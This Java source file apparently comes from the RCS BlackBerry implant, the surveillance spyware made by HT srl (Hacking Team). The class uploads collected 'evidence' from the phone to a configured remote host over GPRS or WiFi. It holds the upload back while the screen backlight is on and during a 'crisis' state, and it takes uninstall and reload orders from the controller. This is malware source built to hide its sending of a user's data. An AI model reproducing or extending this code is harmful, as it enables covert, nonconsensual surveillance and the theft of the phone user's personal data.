//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SyncAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Display;
import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.Device;
import blackberry.agent.Agent;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.evidence.EvidenceCollector;
import blackberry.transfer.Transfer;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncAction.
 */
public class SyncActionInternet extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
    //#endif

    EvidenceCollector logCollector;
    AgentManager agentManager;
    Transfer transfer;

    protected boolean wifiForced;
    protected boolean wifi;
    protected boolean gprs;
    protected Vector apns;

    boolean ssl = false;

    String host = "";
    int port = 80;

    /**
     * Instantiates a new sync action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SyncActionInternet(final int actionId_, final byte[] confParams) {
        this(actionId_);
        parse(confParams);

        //#ifdef DBC
        Check.requires(actionId == ACTION_SYNC_INTERNET, "Wrong ActionId");
        //#endif

        logCollector = EvidenceCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();
    }

    /**
     * Instantiates a new sync action.
     * 
     * @param host_
     *            the host_
     */
    public SyncActionInternet(final String host_) {
        super(ACTION_SYNC_INTERNET);
        host = host_;
    }

    protected SyncActionInternet(final int actionId) {
        super(actionId);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public final boolean execute(final Event triggeringEvent) {
        //#ifdef DEBUG
        debug.info("SyncAction execute: " + triggeringEvent);
        //#endif

        if (status.synced == true) {
            //#ifdef DEBUG
            debug.warn("Already synced in this action: skipping");
            //#endif
            return false;
        }

        if (status.crisisSync()) {
            //#ifdef DEBUG
            debug.warn("SyncAction - no sync, we are in crisis");
            //#endif
            return false;
        }
        
        if (Backlight.isEnabled()) {
            //#ifdef DEBUG
            debug.warn("SyncAction - no sync, backlight enabled");
            //#endif
            return false;
        }

        wantReload = false;
        wantUninstall = false;

        //#ifdef DBC
        Check.asserts(logCollector != null, "logCollector == null");
        //#endif

        transferInit();

        // Stop degli agenti che producono un singolo log

        //agentManager.reStart(Agent.AGENT_POSITION);
        //agentManager.reStart(Agent.AGENT_APPLICATION);

        //agentManager.reStart(Agent.AGENT_CLIPBOARD);
        //agentManager.reStart(Agent.AGENT_URL);
        agentManager.reStart(Agent.AGENT_DEVICE);

        Utils.sleep(500);

        //#ifdef DEBUG
        debug.ledStart(Debug.COLOR_YELLOW);
        //#endif
        
        final boolean ret = transfer.startSession();
        
        //#ifdef DEBUG
        debug.ledStop();
        //#endif

        wantUninstall = transfer.uninstall;
        wantReload = transfer.reload;

        if (ret) {
            //#ifdef DEBUG
            debug.info("SyncAction OK");
            //#endif

            status.synced = true;
            return true;
        }

        //#ifdef DEBUG
        debug.error("InternetSend Unable to perform");
        //#endif

        return false;

    }

    protected void transferInit() {
        transfer.init(host, port, ssl, wifiForced, wifi, gprs);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            gprs = databuffer.readInt() == 1;
            wifi = databuffer.readInt() == 1;

            if (Conf.SYNCACTION_FORCE_WIFI) {
                wifiForced = wifi;
            } else {
                wifiForced = false;
            }

            final int len = databuffer.readInt();
            final byte[] buffer = new byte[len];
            databuffer.readFully(buffer);

            host = WChar.getString(buffer, true);

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("gprs: " + gprs);
        sb.append(" wifi: " + wifi);
        sb.append(" wifiForced: " + wifiForced);
        sb.append(" host: " + host);
        debug.trace(sb.toString());
        //#endif

        return true;
    }

    public String toString() {
        final StringBuffer sb = new StringBuffer();
        sb.append("Sync gprs: " + gprs);
        sb.append(" wifi: " + wifi);
        sb.append(" host: " + host);
        return sb.toString();
    }
}
